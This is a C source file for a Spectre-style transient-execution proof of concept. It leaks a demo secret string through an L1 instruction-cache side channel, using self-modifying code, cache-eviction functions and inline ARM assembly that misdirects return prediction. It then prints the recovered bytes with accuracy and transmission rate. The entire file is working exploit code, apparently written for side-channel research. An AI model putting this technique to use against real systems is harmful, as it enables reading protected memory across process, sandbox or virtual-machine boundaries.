#define _GNU_SOURCE

#include <assert.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/time.h>
#include "smc.h"

#define L1I_ALIGN 0x4000

#if defined(__riscv)
#define NOP_BLOCKS0          \
    asm volatile(            \
        ".rept 4096*4\n\t"   \
        "nop\n\t"            \
        "jalr x0, 0(x1)\n\t" \
        ".endr\n\t"          \
        :);
#else
#define NOP_BLOCKS0        \
    asm volatile(          \
        ".rept 4096*4\n\t" \
        "nop\n\t"          \
        "ret\n\t"          \
        ".endr\n\t"        \
        :);
#endif

__attribute__((aligned(L1I_ALIGN))) void func_evict0()
{
    NOP_BLOCKS0
}

__attribute__((aligned(L1I_ALIGN))) void func_evict1()
{
    NOP_BLOCKS0
}

__attribute__((aligned(L1I_ALIGN))) void func_evict2()
{
    NOP_BLOCKS0
}

__attribute__((aligned(L1I_ALIGN))) void func_evict3()
{
    NOP_BLOCKS0
}

inline static size_t flush(void *p)
{
#if defined(__x86_64__)
    asm volatile("clflush (%0)\n" ::"c"((uint64_t)p) : "rax");
#elif defined(__aarch64__)
    asm volatile("DC CIVAC, %0\n" ::"r"((uint64_t)p) : "memory");
    // printf("flush: %x\n", (uint64_t)p);
#else
    perror("Not implement");
#endif
}

uint64_t gettimestamp()
{
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return tv.tv_sec * (uint64_t)1000000 + tv.tv_usec;
}

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char secret[] = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* To not optimize out victim_function() */

void victim_function(size_t x)
{
    VirtualAddress va_evict;
    va_evict.address = (uint64_t)func_evict0;
    if (x < array1_size)
    {
        uint8_t secret_data = array1[x];
        va_evict.split.index = secret_data;
        volatile void (*func_evict)() = (void *)va_evict.address;
        func_evict();
    }
}

size_t mem_pool[16];

void transient_call_func(size_t x)
{
    VirtualAddress va_evict;
    va_evict.address = (uint64_t)func_evict0;
    uint8_t secret_data = array1[x];
    va_evict.split.index = secret_data;
    volatile void (*func_evict)(void) = (void *)va_evict.address;
    volatile char data = *(char *)func_evict;
    volatile void *func_addr = &func_evict;
    // https://developer.arm.com/documentation/100798/0401/L1-memory-system/L1-instruction-memory-system/Program-flow-prediction
    asm volatile(
        "   bl setup\n"
        "gadget:\n" // Speculatively return here.
        "   ldr x0, [%0, #0]\n"
        "   br x0\n"
        "   wfi\n"
        "   mov x0, #0\nldr x0, [x0, #0]\n" // Illegal Load
        "setup:\n"
        "   adr x0, architectural_return\n"
        "   str x0, [%1, #0]\n"
        "   dc civac, %1\n"
        "   ldr x30, [%1, #0]\n"
        "   ret\n"
        "architectural_return:\n"
        :
        : "r"(func_addr), "r"(&mem_pool)
        : "x0", "x30");
}

unsigned char code[] = {
#if defined(__x86_64__)
    // x86, https://defuse.ca/online-x86-assembler.htm#disassembly
    0xB8, 0x00, 0x00, 0x00, 0x00, //  mov eax, 0
    0x83, 0xC0, 0x01,             //  add eax, 2
    0xC3,                         //  ret
#elif defined(__aarch64__)
    // arm, https://shell-storm.org/online/Online-Assembler-and-Disassembler
    0x00, 0x00, 0x80, 0xd2, // mov x0, #0
    0x00, 0x04, 0x00, 0x91, // add x0, x0, #2
    0xc0, 0x03, 0x5f, 0xd6, // ret
#elif defined(__riscv)
    // rv, https://rvcodec-js.vercel.app/
    0x37, 0x5, 0x00, 0x00,  // lui a0, 0  <=> lui x10, 0
    0x13, 0x05, 0x15, 0x00, // addi a0, a0, 1 <=> addi x10, x10, 1
    0x67, 0x80, 0x00, 0x00, // jalr zero, 0(ra))  <=> jalr x0, 0(x1)
#else
#endif
};

char leakys[1024];
int leakys_index = 0;

void test(void *mem, long page_size, long offset)
{
    long evict_set = 0;
    int (*func)() = mem;
    VirtualAddress va;
    va.address = (uint64_t)mem;
    va.split.tag += 1;
    va.split.index = 0;
    volatile int result = 0;
    int (*func_list[L1I_SET_NUM][L1I_SET_SIZE])();
    for (int i = 0; i < L1I_SET_NUM; i++)
    {
        VirtualAddress va_way = va;
        for (size_t j = 0; j < L1I_SET_SIZE; j++)
        {
            va_way.split.tag = va_way.split.tag + j;
            func_list[i][j] = (void *)va_way.address;
            memcpy(func_list[i][j], code, sizeof(code));
            if (i == (L1I_SET_NUM - 1) || i == 0)
            {
                // printf("func: %p\t", *func_list[i]);
            }
        }
        va.split.index++;
    }
    // printf("\n");
    va.address = (uint64_t)func_evict0;
    // printf("evict > addr: %lx, tag: %lx, idx: %x, offset: %x\n",
    //        va.address, (uint64_t)va.split.tag, va.split.index, va.split.offset);
    void(*func_evicts[L1I_SET_SIZE]);
    func_evicts[0] = &func_evict0;
    func_evicts[1] = &func_evict1;
    func_evicts[2] = &func_evict2;
    func_evicts[3] = &func_evict3;

    void *mem_evict = mmap(
        NULL, page_size * 1024 * 1024, PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (mprotect(mem_evict, page_size * 32, PROT_READ | PROT_WRITE | PROT_EXEC) == -1)
    {
        perror("mprotect");
        munmap(mem_evict, page_size);
        return;
    }
    for (int i = 0; i < page_size * 32; i += 4)
    {
#if defined(__x86_64__) // x86: ret
        ((uint8_t *)mem_evict)[i + 0] = 0xc3;
        ((uint8_t *)mem_evict)[i + 1] = 0xc3;
        ((uint8_t *)mem_evict)[i + 2] = 0xc3;
        ((uint8_t *)mem_evict)[i + 3] = 0xc3;
#elif defined(__aarch64__) // arm:  ret
        ((uint8_t *)mem_evict)[i + 0] = 0xc0;
        ((uint8_t *)mem_evict)[i + 1] = 0x03;
        ((uint8_t *)mem_evict)[i + 2] = 0x5f;
        ((uint8_t *)mem_evict)[i + 3] = 0xd6;
#elif defined(__riscv)     // riscv: ret
        ((uint8_t *)mem_evict)[i + 0] = 0x67;
        ((uint8_t *)mem_evict)[i + 1] = 0x80;
        ((uint8_t *)mem_evict)[i + 2] = 0x00;
        ((uint8_t *)mem_evict)[i + 3] = 0x00;
#endif
    }
    for (int i = 0; i < L1I_SET_SIZE; i++)
    {
        VirtualAddress va_evict;
#if defined(__riscv)
        va_evict.address = (uint64_t)mem_evict;
        if (va_evict.split.index > evict_set)
        {
            va_evict.split.tag++;
        }
        va_evict.split.tag = va_evict.split.tag + i;
        va_evict.split.index = evict_set;
#else
        va_evict.address = (uint64_t)func_evicts[i];
        va_evict.split.index = evict_set;
#endif
        func_evicts[i] = (void *)va_evict.address;
    }
    va.address = (uint64_t)func_evicts[0];
    // printf("evict change > addr: %lx, tag: %lx, idx: %x, offset: %x\n",
    //        va.address, (uint64_t)va.split.tag, va.split.index, va.split.offset);
    size_t malicious_x =
        (size_t)(secret - (char *)array1) + offset;

    int count[L1I_SET_NUM][L1I_SET_SIZE], sum = 5;
    memset(count, 0, sizeof(count));
    for (int j = 0; j < sum; j++)
    {
        int tries = sum;
        volatile size_t training_x, x;
        training_x = tries % array1_size;
        for (int k = 0; k < L1I_SET_NUM; k++)
        {
            for (size_t l = 0; l < L1I_SET_SIZE; l++)
            {
                func = func_list[k][l];
#if defined(__x86_64__)
                ((uint8_t *)func)[7] = 0x1;
#elif defined(__aarch64__)
                ((uint8_t *)func)[5] = 0x4;
#elif defined(__riscv)
                ((uint8_t *)func)[6] = 0x15;
#endif
                asm volatile("ic ivau, %0;isb sy;isb sy;" ::"r"((uint64_t)func) : "memory");
                asm volatile("dsb st;dsb sy;isb;isb sy;isb sy;");
                result = func();
#if defined(__x86_64__) //
                ((uint8_t *)func)[7] = 0x2;
#elif defined(__aarch64__) //
                ((uint8_t *)func)[5] = 0x8;
#elif defined(__riscv)     //
                ((uint8_t *)func)[6] = 0x25;
#endif
            }
            asm volatile("dsb st;dsb sy;isb;isb sy;isb sy;");
            // Training and running the Spectre gadget
            for (int l = 29; l >= 0; l--)
            {
                for (volatile size_t i = 0; i < 34; i++)
                {
                }
                flush(&array1_size);
                x = ((l % 6) - 1) & ~0xFFFF;
                x = (x | (x >> 16));
                x = training_x ^ (x & (malicious_x ^ training_x));
                // victim_function(x);
                transient_call_func(x);
            }
            asm volatile("dsb st;dsb sy;isb;isb sy;isb sy;");
            for (volatile register int l = 0; l < 1000; l++)
            {
            }
            for (size_t l = 0; l < L1I_SET_SIZE; l++)
            {
                func = func_list[k][l];
                result = func();
                if (result == 2)
                {
                    count[k][l]++;
                }
            }
        }
    }
    // VirtualAddress va;
    va.address = (uint64_t)func;
    assert((uint64_t)func == (uint64_t)va.address);
    leakys[offset] = ' ';
    for (int j = 0; j < L1I_SET_NUM; j++)
    {
        int has_output = 0;
        for (int l = 0; l < L1I_SET_SIZE; l++)
        {
            if (count[j][l] == sum && isprint(j))
            {
                printf("[%3d:%1d|%c] %1d ", j, l, (isprint(j) ? j : ' '), count[j][l]);
                has_output = 1;
                leakys[offset] = j;
                leakys[offset + 1] = '\0';
            }
        }
        if (has_output)
        {
            printf("\n");
        }
    }
    return;
}

int main()
{
    long page_size = sysconf(_SC_PAGESIZE);
    void *mem = mmap(NULL, page_size * 32, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED)
    {
        perror("mmap");
        return 1;
    }
    memset(mem, 0, page_size);
    memcpy(mem, code, sizeof(code));

    if (mprotect(mem, page_size * 32, PROT_READ | PROT_WRITE | PROT_EXEC) == -1)
    {
        perror("mprotect");
        munmap(mem, page_size);
        return 1;
    }
    printf("max addr: %p\n", mem + page_size * 32);

    VirtualAddress va;
    va.address = (uint64_t)mem;
    printf("addr: %lx, tag: %lx, idx: %x, offset: %x\n",
           va.address, (uint64_t)va.split.tag, va.split.index, va.split.offset);

    uint64_t starttime = gettimestamp();
    for (int i = 0; i < sizeof(secret); i++)
    {
        test(mem, page_size, i);
    }
    uint64_t stoptime = gettimestamp();
    int correct = 0, len = strlen(secret);
    printf("secret: %s\n", secret);
    printf("leakys: %s\n", leakys);
    for (int i = 0; i < len; i++)
    {
        if (leakys[i] == secret[i])
        {
            correct++;
        }
    }
    printf("correct: %d/%d, accuracy: %f\n", correct, len, (float)correct / len);
    uint64_t usec_used = stoptime - starttime;
    printf("receiver finished\n");
    double tr = 1.f * len / ((usec_used * 1.f) / 1000000.0);
    printf("[+] Raw Transmission rate %.1f b/s, a.k.a %.1f B/s\n", tr, tr / 8.0);
    printf("[+] Time used: %ld microseconds\n", (usec_used));

    printf("sizeof(secrets): %d, correct: %d, accuracy: %.3f%%\n",
           len, correct, 1.f * correct / len * 100);

    munmap(mem, page_size * 32);
    return 0;
}